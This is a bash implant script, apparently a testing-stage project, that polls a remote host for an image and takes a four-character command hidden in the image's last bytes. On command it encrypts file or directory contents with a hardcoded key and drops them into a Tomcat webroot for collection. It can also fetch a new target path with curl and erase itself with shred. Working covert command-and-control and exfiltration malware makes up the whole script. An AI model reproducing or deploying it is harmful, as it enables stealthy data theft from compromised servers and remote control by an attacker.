#!/bin/bash

"""
This is the script that is downloaded + run every night
W/out cron version
"""
ip_addr=$1
text_path=/../
image_name="mainImage.png"
vul_path="/usr/local/tomcat/webapps/ROOT/"
pswd=0xC639A572E14D5075C526FDDD43E4ECF6B095EA17783D32EF3D2710AF9F359DD4
#testing vars:
wait_time=20

while true
do
    current=$(date +%s)
    #Pull image down from site
    wget -nd -r $image_name -A jpeg,jpg,bmp,gif,png http://$ip_addr:8000/$image_name
    #check if there is an image, if not assume connection is broken and delete self
    if [[ 100 < 1 ]]; then
        echo "image hasn't been uploaded"
        #remove scripts
        shred $0
        echo "delete" 
        exit
    fi

    #Load downloaded image
    load_image=$(<$image_name)

    #Take the command
    cmnd="$(echo $load_image | tail -c 5)"
    #delete image after taking command
    rm $image_name 

    echo $cmnd
    #Follow according to that command
    if [ $cmnd = "0000" ]; then #post data pointed to by $text_path
        #post secret data to website 
        secret=$vul_path"secretData.html" 
        touch $secret 
        if [ -d $text_path ]; then
            dir=$(ls $text_path*)
            echo $dir | openssl enc -aes-256-cbc -md md5 -out $secret -k $pswd 
        elif [ -f $text_path ]; then #file
            cat $text_path | openssl enc -aes-256-cbc -md md5 -out $secret -k $pswd 
        fi
        echo "post"
        #sleep for 1 hour
        sleep $wait_time
        echo "deleting secretData"
        rm -f $secret
    #elif: change ip address
    elif [ $cmnd = "1111" ]; then #Delete self
        #delete all mentions in crontainer
        #remove scripts
        shred $0
        echo "delete" 
        exit
    elif [ $cmnd = "1101" ]; then #change file path
        echo "change path"
        text_path=$(curl http://$ip_addr:8000/path.html) 
        echo $text_path
    elif [ $cmnd = "1011" ]; then #send back directory
        secret=$vul_path"secretData.html"
        touch $secret 
        dir=$(ls $text_path*)
        echo $dir | openssl enc -aes-256-cbc -md md5 -out $secret -k $pswd 
        echo "get directory"
        sleep $wait_time
        echo "deleting secretData"
        rm -f $secret
    fi


    #calculate number of seconds to sleep until next night
    current=$(date +%s)
    target=$(date -d 'tomorrow 1:30' +%s)
    sleep_seconds=$(( $target - $current ))
    echo "sleep $sleep_seconds"

    #Testing for now sleep 100 seconds, 
    #after testing, change to sleep $sleep_seconds
    sleep $wait_time

done
